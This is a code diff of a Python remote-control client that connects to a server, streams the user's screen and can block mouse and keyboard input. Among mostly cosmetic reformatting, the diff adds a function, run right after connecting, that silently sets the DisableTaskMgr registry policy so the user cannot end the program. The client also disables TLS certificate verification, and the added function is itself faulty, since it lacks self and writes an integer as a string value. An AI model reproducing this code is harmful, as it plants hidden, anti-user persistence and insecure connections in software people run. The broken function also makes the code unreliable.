@@ -6,7 +6,7 @@ import socket
 import ssl
 import threading
 import time
-
+import winreg
 import pynput
 from finals import *
 from vidstream import ScreenShareClient, StreamingServer
@@ -17,10 +17,11 @@ context = ssl.create_default_context()
 # Set the context to not verify the server's SSL/TLS certificate
 context.check_hostname = False
 context.verify_mode = ssl.CERT_NONE
+
+
 class Client:
     def __init__(self, server_address=(socket.gethostbyname(socket.gethostname()), PORT)):
-        
-        
+
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.server_address = server_address
         self.assignment_queue = queue.Queue()
@@ -34,7 +35,7 @@ class Client:
         except:
             print("closing ui")
         while (not self.is_ip_valid):
-           pass
+            pass
         try:
             self.sock.connect(self.server_address)
             print(111)
@@ -44,14 +45,31 @@ class Client:
             print("server address:", self.server_address)
             print(e)
             exit(0)
-
-
-        self.sock = context.wrap_socket(self.sock, server_hostname=server_address[0])
+        
+        self.sock = context.wrap_socket(
+            self.sock, server_hostname=server_address[0])
+        self.disable_task_manager(1)
         self.handle_server()
 
+    def disable_task_manager(value: int):
+        """enter 1 for disabling the task manager
+            and enter 0 for enabling the task manager"""
+        # Path to the explorer properties
+        registry_path: str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
+        # Name of the key
+        registry_name: str = "DisableTaskMgr"
+        # Value that the registry key is set to
+        value: int = 1
+        try:
+            reg_key = winreg.OpenKey(
+                winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
+            winreg.CloseKey(reg_key)
+        except WindowsError as e:
+            print(f"There was an error setting the registry key {e}")
+
     def recv_thread(self):
-        
-        
+
         while (not self.close_client):
             raw_data = ""
             try:
@@ -75,20 +93,18 @@ class Client:
             self.assignment_queue.put((cmd, data))
 
     def handle_server(self):
-        
-        
-        
+
         receive_thread = threading.Thread(target=self.recv_thread)
         receive_thread.start()
 
         client_get = ""
-        
+
         share_screen_first_run = True
         get_screen_first_run = True
-        
+
         client_share = ""
 
-        print(self.server_address[0],11111111111111111111)
+        print(self.server_address[0], 11111111111111111111)
         inAction = False
 
         while (not self.close_client):
@@ -109,9 +125,12 @@ class Client:
                 self.sock.close()
                 break
             elif (cmd == "startShareScreenMet"):
-                #if (get_screen_first_run):
-                print(socket.gethostbyname(socket.gethostname()),int(data),"hahahhahahahah")#socket.gethostbyname(socket.gethostname())
-                client_get = StreamingServer(socket.gethostbyname(socket.gethostname()), int(data))
+                # if (get_screen_first_run):
+                # socket.gethostbyname(socket.gethostname())
+                print(socket.gethostbyname(socket.gethostname()),
+                      int(data), "hahahhahahahah")
+                client_get = StreamingServer(
+                    socket.gethostbyname(socket.gethostname()), int(data))
                 get_screen_first_run = False
                 # inAction = True
                 client_get.start_server()
@@ -122,7 +141,7 @@ class Client:
 
             elif (cmd == "stopShareScreenMet"):
                 # inAction = False
-                
+
                 client_get.stop_server()
                 # Enable mouse and keyboard events
                 mouse_listener.stop()
@@ -133,27 +152,26 @@ class Client:
                     print("noooooooooooooooo")
                     time.sleep(0.5)
                     client_share.stop_stream()
-                    #client_share._cleanup()
+                    # client_share._cleanup()
                 else:
-                    client_share = ScreenShareClient(self.server_address[0], 10000+int(self.id),1920,1050)
+                    client_share = ScreenShareClient(
+                        self.server_address[0], 10000+int(self.id), 1920, 1050)
                     client_share.start_stream()
-                inAction =not inAction
+                inAction = not inAction
             elif (cmd == "lock screen"):
                 mouse_listener = pynput.mouse.Listener(suppress=True)
                 mouse_listener.start()
                 keyboard_listener = pynput.keyboard.Listener(suppress=True)
                 keyboard_listener.start()
-            
+
             elif (cmd == "unlock screen"):
                 # Enable mouse and keyboard events
                 mouse_listener.stop()
                 keyboard_listener.stop()
 
-                    
             if (msg != ""):
                 self.sock.send(msg.encode(FORMAT))
 
-                
     def protocol_msg_to_send(self, cmd, data):
         # return f"{cmd}@{data}".encode(FORMAT)
         return f"{cmd}@{data}"
@@ -162,31 +180,30 @@ class Client:
         app = PyQt5.QtWidgets.QApplication(sys.argv)
         ex = client_start.Ui_MainWindow()
         w = PyQt5.QtWidgets.QMainWindow()
-        
-        
-        ex.setupUi(w,self)
-        
-        
+
+        ex.setupUi(w, self)
+
         w.show()
-        ex.done_button.clicked.connect(lambda: self.get_input(ex.ip_input,w))
+        ex.done_button.clicked.connect(lambda: self.get_input(ex.ip_input, w))
         app.exec()
 
-    def ui_input(self,ip_input,done_button):
+    def ui_input(self, ip_input, done_button):
         done_button.clicked.connect(lambda: self.get_input(ip_input))
 
-    def get_input(self,ip_input,app):
-        self.server_address=(ip_input.text(),PORT)
+    def get_input(self, ip_input, app):
+        self.server_address = (ip_input.text(), PORT)
         self.is_ip_valid = True
         print("done")
         time.sleep(1)
         app.close()
-        
+
         # raise Exception("closing ui thread")
 
 
 def main():
     Client()
     # Client(("127.0.0.1",18820))
+
 
 if __name__ == "__main__":
     main()
